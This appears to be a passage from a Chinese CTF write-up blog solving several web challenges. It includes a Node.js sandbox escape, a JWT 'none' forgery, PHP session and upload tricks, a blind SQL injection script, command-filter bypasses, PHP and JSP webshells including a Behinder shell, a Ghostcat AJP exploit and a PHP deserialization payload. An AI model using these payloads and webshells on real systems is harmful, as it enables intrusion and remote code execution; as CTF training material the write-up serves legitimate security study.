<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>但是 waf 很多字符，发现可以用数组绕过，所以最终 payload 是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/run.php?code[]=(function()&#123; TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1; &#125;catch(e)&#123; return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString(); &#125; &#125;)()</span><br></pre></td></tr></table></figure>



<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p><strong>JWT</strong></p>
<p>查看 app.js 发现是 koa 框架，根据框架搜到源码在 controllers&#x2F;api.js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;)</span><br><span class="line"></span><br><span class="line">const APIError = require(&#x27;../rest&#x27;).APIError;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);</span><br><span class="line">        const secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || !password) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        console.log(sid)</span><br><span class="line"></span><br><span class="line">        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">        const status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        if(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        if(ctx.session.username !== &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const flag = fs.readFileSync(&#x27;/flag&#x27;).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = null;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: true</span><br><span class="line">        &#125;)</span><br><span class="line">        await next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里可以通过设置secretid为数组，加密算法为空绕过登陆验证，payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import jwt</span><br><span class="line">print(jwt.encode(&#123;&quot;secretid&quot;:[],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 158763206&#125;, &#x27;&#x27;, algorithm=&#x27;none&#x27;))</span><br><span class="line"></span><br><span class="line">#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU4NzYzMjA2fQ.</span><br></pre></td></tr></table></figure>

<p>然后直接访问 &#x2F;api&#x2F;flag 就行了</p>
<h2 id="HFCTF2020-BabyUpload"><a href="#HFCTF2020-BabyUpload" class="headerlink" title="[HFCTF2020]BabyUpload"></a>[HFCTF2020]BabyUpload</h2><p><strong>文件上传</strong></p>
<p>要想拿到 flag 需要满足以下条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SESSION[&#x27;username&#x27;] ===&#x27;admin&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=&#x27;/var/babyctf/success.txt&#x27;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们需要伪造 admin 然后再创建一个 success.txt 文件</p>
<p>看看代码逻辑，sess 文件存储在根目录，令 attr&#x3D;. 就可以读取当前目录，文件名则为 sess_PHPSESSID，刚好文件的命名方式为 ‘文件名’ + ‘_’ + ‘文件内容哈希值’，所以满足伪造 admin 的条件，首先我们先读一下 sess 文件是用什么存储引擎的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests as rq</span><br><span class="line"></span><br><span class="line">url = &quot;http://91291e0d-960a-4f9c-91e0-c6f251ca14e1.node3.buuoj.cn/&quot;</span><br><span class="line">data = &#123;&quot;filename&quot;:&quot;sess_c82aa666b4f44ff16a6e88bdd1fb6d1d&quot;,&quot;attr&quot;:&quot;.&quot;,&quot;direction&quot;:&quot;download&quot;&#125;</span><br><span class="line">res = rq.post(url, data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>返回 sess 文件的内容是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usernames:5:&quot;guest&quot;;</span><br></pre></td></tr></table></figure>

<p>可以推测起采用的存储引擎是<code>php_binary</code>，本地自己生成一个 sess 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_binary&#x27;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&#x27;name&#x27;] = &#x27;admin&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>打开自己的 php.ini 看看 session.save_path 在哪里，用十六进制打开文件我们可以看到 username 前面其实还有一个不可见字符<code>0x08</code>，它表示的是 username 的长度，所以在传文件时，我们需要注意这个不可见字符</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527110924.png" alt="image-20200518180309624"></p>
<p>所以上传 sess 文件，所以文件名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests as rq</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">url = &quot;http://91291e0d-960a-4f9c-91e0-c6f251ca14e1.node3.buuoj.cn/&quot;</span><br><span class="line">files = &#123;&quot;up_file&quot;: (&quot;sess&quot;, &#x27;\x08usernames:5:&quot;admin&quot;;&#x27;)&#125;</span><br><span class="line">data = &#123;&quot;attr&quot;:&quot;.&quot;,&quot;direction&quot;:&quot;upload&quot;&#125;</span><br><span class="line">res = rq.post(url, data=data, files=files)</span><br><span class="line">print(res.text)</span><br><span class="line">PHPSSID = hashlib.sha256(b&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;).hexdigest()</span><br><span class="line">print(f&#x27;filename: sess_&#123;PHPSSID&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p><code>file_exists</code>可以判断文件或目录是否存在，所以这里把 attr 改成 success.txt 即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests as rq</span><br><span class="line"></span><br><span class="line">files = &#123;&quot;up_file&quot;: (&quot;kk&quot;, &#x27;hack&#x27;)&#125;</span><br><span class="line">data = &#123;&quot;attr&quot;:&quot;success.txt&quot;,&quot;direction&quot;:&quot;upload&quot;&#125;</span><br><span class="line">res = rq.post(url, data=data, files=files)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>带上 admin 的 cookie 就可以看到 flag 了</p>
<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p><strong>异或盲注</strong></p>
<p>有一个查询接口，简单测试可以发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?stunum=1^1^1 =&gt; Hi admin, your score is: 100</span><br><span class="line">?stunum=1^0^1 =&gt; student number not exists.</span><br></pre></td></tr></table></figure>

<p>所以是布尔盲注，过滤了空格，祭出老脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Pool, Manager</span><br><span class="line">import requests, time</span><br><span class="line"></span><br><span class="line">def func(index, results):</span><br><span class="line"></span><br><span class="line">    l = 0</span><br><span class="line">    r = 127</span><br><span class="line">    m = (l+r)//2</span><br><span class="line"></span><br><span class="line">    while l&lt;r:</span><br><span class="line">        url = &#x27;http://c890296e-d508-471e-b89c-1dc73859c8a4.node3.buuoj.cn&#x27;</span><br><span class="line">        payload = f&quot;1^(ascii(mid((select/**/value/**/from/**/flag),&#123;index + 1&#125;,1))&gt;&#123;m&#125;)^1&quot;</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">        paramsGet = &#123;&quot;stunum&quot;:payload&#125;</span><br><span class="line">        res = requests.get(url, params=paramsGet)</span><br><span class="line">        if &#x27;admin&#x27; in res.text:</span><br><span class="line">            l = m + 1</span><br><span class="line">        else:</span><br><span class="line">            r = m</span><br><span class="line">        m = (l + r) // 2</span><br><span class="line">    print(index + 1, m)</span><br><span class="line">    results[index] = m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    num = 5</span><br><span class="line">    data_num = 50</span><br><span class="line">    data = range(data_num)</span><br><span class="line">    pool = Pool(processes=num)</span><br><span class="line">    manager = Manager()</span><br><span class="line">    results = manager.list([0]*data_num)</span><br><span class="line">    jobs = []</span><br><span class="line">    for d in data:</span><br><span class="line">        job = pool.apply_async(func, (d, results))</span><br><span class="line">        jobs.append(job)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(results)</span><br><span class="line">    results = &#x27;&#x27;.join([chr(_) for _ in results])</span><br><span class="line">    print(results)</span><br></pre></td></tr></table></figure>



<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p><strong>代码审计</strong></p>
<p>robots.txt 信息泄露</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /fAke_f1agggg.php</span><br></pre></td></tr></table></figure>

<p>访问一下响应头有东西</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111232.png" alt="image-20200526171751316"></p>
<p>然后是个代码审计</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">   $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>第一层可以利用十六进制绕过 <code>intval</code> ，intval(str)为0，但是intval(str+1) 会自动转换成数值</p>
<blockquote>
<p>php7里面修复了这个漏洞</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">num=0x1234</span><br></pre></td></tr></table></figure>

<p>第二层 md5 双哈希为 0e 绕过，检索一下就有了</p>
<p><a href="http://wh4lter.icu/2017/10/15/php_MD5/">http://wh4lter.icu/2017/10/15/php_MD5/</a></p>
<p>当然你也可以采用脚本爆破（不推荐，十分漫长）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib, vthread</span><br><span class="line"></span><br><span class="line">@vthread.pool(100)</span><br><span class="line">def find(v):</span><br><span class="line">    v = (&#x27;0e&#x27; + str(v)).encode()</span><br><span class="line">    vv = hashlib.md5(v).hexdigest()</span><br><span class="line">    if vv[:2] == &#x27;0e&#x27; and vv[2:].isdigit():</span><br><span class="line">        print(&#x27;[+] find&#x27;, v, vv)</span><br><span class="line"></span><br><span class="line">for i in range(int(1e8), int(1e10)):</span><br><span class="line">    find(i)</span><br></pre></td></tr></table></figure>

<p>随便拿一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5=0e00275209979</span><br></pre></td></tr></table></figure>

<p>第三层空格用 <code>$&#123;IFS&#125;</code>，命令直接用斜杠绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_flag=ca\t$&#123;IFS&#125;fll*</span><br></pre></td></tr></table></figure>



<h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p><strong>文件上传</strong></p>
<p>诶 注册登录随便传个马就 getshell 了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_REQUEST[&#x27;1&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>连上去 ?1&#x3D;system(‘cat &#x2F;*’); 就行了</p>
<h2 id="WUSTCTF2020-easyweb"><a href="#WUSTCTF2020-easyweb" class="headerlink" title="[WUSTCTF2020]easyweb"></a>[WUSTCTF2020]easyweb</h2><p><strong>幽灵猫漏洞</strong></p>
<p>随意上传文件就可以进行下载，得到任意读文件接口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/download?file=</span><br></pre></td></tr></table></figure>

<p>报错得出了路径</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111428.png" alt="image-20200522213124031"></p>
<p>但是 uploads 目录并不能访问</p>
<p>查看 web.xml 发现使用了 tomcat.ajp 协议</p>
<p> <img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111434.png" alt="image-20200522213604609"></p>
<p>联想到用幽灵猫漏洞进行文件包含从而执行命令</p>
<p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p>
<p>先获取靶机的内网地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/download?file=../../../../../../../etc/hosts</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111438.png" alt="image-20200522212808809"></p>
<p>上传可以命令执行的 js 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(&quot;Executing command&quot;);</span><br><span class="line">Process p = Runtime.getRuntime().exec(&quot;ls /&quot;);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream in = p.getInputStream();</span><br><span class="line">DataInputStream dis = new DataInputStream(in);</span><br><span class="line">String disr = dis.readLine();</span><br><span class="line">while ( disr != null ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr = dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>开一个 Linux Labs 运行 ajpShooter.py 执行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ajpShooter.py http://174.1.115.127 8009 /WEB-INF/uploads/fe845d95-805e-4fb7-aac3-7bc</span><br><span class="line">ca4c935ba.jsp eval</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111442.png" alt="image-20200522212736292"></p>
<p>后面直接 cat &#x2F;flag* 就好了</p>
<h2 id="WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="[WUSTCTF2020]Train Yourself To Be Godly"></a>[WUSTCTF2020]Train Yourself To Be Godly</h2><p><strong>tomcat</strong></p>
<blockquote>
<p>参考 <a href="https://imagin.vip/?p=1323">https://imagin.vip/?p=1323</a> 文章</p>
</blockquote>
<p>打开是一个 tomcat 界面，报错现在当前目录在 examples</p>
<p>利用 Nginx 和 Tomcat 对某些标点解析的差异性进行目录穿越，进入后台页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://dcf11651-b9f9-4e12-80ed-038dbf7c34fb.node3.buuoj.cn/..;/manager/html</span><br></pre></td></tr></table></figure>

<p>后台默认密码是  tomcat &#x2F; manager</p>
<p>这里是利用弱口令  tomcat &#x2F; tomcat</p>
<p>后面就是熟悉的 war 上传 webshell 了</p>
<p>上一个冰蝎的 shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;</span><br></pre></td></tr></table></figure>

<p>生成 war 包</p>
<blockquote>
<p>或者打包成 zip 然后改成 war</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar cvf exp.war shell.jsp</span><br></pre></td></tr></table></figure>

<p>直接上传会 404，因为路径会再添加一个 examples</p>
<p>修改路径后会出现 401，因为缺少了授权信息，需要我们自己添加 Authorization 头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br></pre></td></tr></table></figure>

<p>添加后出现 403，这是因为我们比正常请求少了一个 cookie，在访问 <code>/manager/html/</code>  时我们会返回一个 cookie</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111449.png" alt="image-20200524183538086"></p>
<p>但是添加 cookie 后我们还是 403</p>
<p>正确方法把那个 Set-Cookie 的返回包抓回来修改 Path 就可以上传成功了</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111453.png" alt="image-20200524184430042"></p>
<p>上传成功</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111819.png" alt="image-20200524185133827"></p>
<p>冰蝎连上去 flag 在环境变量</p>
<blockquote>
<p>根目录也有 &#x2F;flagggg</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200527111458.png" alt="image-20200524194151982"></p>
<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>**命令执行题目</p>
<p>一进去发现传参的参数是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func=date&amp;p=Y-m-d+h%3Ai%3As+a</span><br></pre></td></tr></table></figure>

<p>随意修改 func 参数发现如下报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  call_user_func() expects parameter 1 to be a valid callback, function &#x27;dte&#x27; not found or invalid function name in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;24&lt;/b&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure>

<p>所以这里就是命令注入了，试了几个命令被 waf 了</p>
<p>先读一下源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func=readfile&amp;p=index.php</span><br><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">function gettime($func, $p) &#123;</span><br><span class="line">    $result = call_user_func($func, $p);</span><br><span class="line">    $a= gettype($result);</span><br><span class="line">    if ($a == &quot;string&quot;) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test &#123;</span><br><span class="line">    var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">    var $func = &quot;date&quot;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">$p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">if ($func != null) &#123;</span><br><span class="line">    $func = strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>显然这里给了一个反序列化的漏洞给我们，调用 unserialze 就可以触发没有经过过滤的 __destruct 函数了，payload 如下</p>
<blockquote>
<p>一开始找不到 flag，直接 find 一下就好</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function send_post($url, $post_data) &#123;</span><br><span class="line">    $postdata = http_build_query($post_data);</span><br><span class="line">    $options = array(</span><br><span class="line">        &#x27;http&#x27; =&gt; array(</span><br><span class="line">            &#x27;method&#x27; =&gt; &#x27;POST&#x27;,</span><br><span class="line">            &#x27;header&#x27; =&gt; &#x27;Content-type:application/x-www-form-urlencoded&#x27;,</span><br><span class="line">            &#x27;content&#x27; =&gt; $postdata,</span><br><span class="line">            &#x27;timeout&#x27; =&gt; 15 * 60 </span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    $context = stream_context_create($options);</span><br><span class="line">    $result = file_get_contents($url, false, $context);</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test &#123;</span><br><span class="line">    // var $p = &quot;find / | grep flag -s&quot;;</span><br><span class="line">    var $p = &quot;cat /tmp/flagoefiu4r93&quot;;</span><br><span class="line">    var $func = &quot;system&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Test();</span><br><span class="line">$p = serialize($a);</span><br><span class="line">$func = &quot;unserialize&quot;;</span><br><span class="line"></span><br><span class="line">$url = &quot;http://4a1bc0f2-7e1f-4309-ab6d-f72e46bcc64c.node3.buuoj.cn/index.php&quot;;</span><br><span class="line">$post_data = array(</span><br><span class="line">    &#x27;func&#x27; =&gt; $func ,</span><br><span class="line">    &#x27;p&#x27; =&gt; $p</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">echo send_post($url, $post_data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p><strong>nmap 老漏洞</strong></p>
<p>先打一个 127.0.0.1 试试，发现 nmap 完 ip 后会存储到一个 xml 文件里面，然后进行文件包含，首先我们需要知道 nmap 有部分文件读写的参数</p>
